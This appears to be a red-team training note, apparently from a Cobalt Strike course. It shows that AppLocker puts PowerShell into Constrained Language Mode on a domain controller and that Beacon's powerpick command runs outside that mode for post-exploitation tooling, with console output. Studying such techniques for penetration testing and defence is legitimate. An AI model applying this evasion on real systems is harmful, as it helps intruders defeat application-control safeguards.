When AppLocker is enabled PowerShell is placed into Constrained Language Mode (CLM), which restricts it to core types. `$ExecutionContext.SessionState.LanguageMode` will show the language mode of the executing process.

```
beacon> remote-exec winrm dc-1 $ExecutionContext.SessionState.LanguageMode

PSComputerName RunspaceId                           Value              
-------------- ----------                           -----              
dc-1           9dd4aebc-540e-4683-b3f7-07b6f799266e ConstrainedLanguage
```
  

This makes most PowerShell tradecraft difficult. `jump winrm[64]` and other PowerShell scripts will fail with the error: **Cannot create type. Only core types are supported in this language mode.**

```
beacon> remote-exec winrm dc-1 [math]::Pow(2,10)

<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Cannot invoke method. Method invocation is supported only on core types in this language mode._x000D__x000A_</S><S S="Error">
```

CLM is as fragile as AppLocker, so any AppLocker bypass can result in CLM bypass. Beacon has a `powerpick` command, which is an "unmanaged" implementation of tapping into a PowerShell runspace, without using `powershell.exe`.

So if we find an AppLocker bypass rule in order to execute a Beacon, `powerpick` can be used to execute post-ex tooling outside of CLM. `powerpick` is also compatible with `powershell-import`.

```
beacon> run hostname
dc-1

beacon> powershell $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

beacon> powershell [math]::Pow(2,10)
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Cannot invoke method. Method invocation is supported only on core types in this language mode._x000D__x000A_</S><S S="Error">At line:1 char:1_x000D__x000A_</S><S S="Error">+ [math]::Pow(2,10)_x000D__x000A_</S><S S="Error">+ ~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : MethodInvocationNotSupportedInConstrainedLanguage_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

beacon> powerpick $ExecutionContext.SessionState.LanguageMode
FullLanguage

beacon> powerpick [math]::Pow(2,10)
1024
```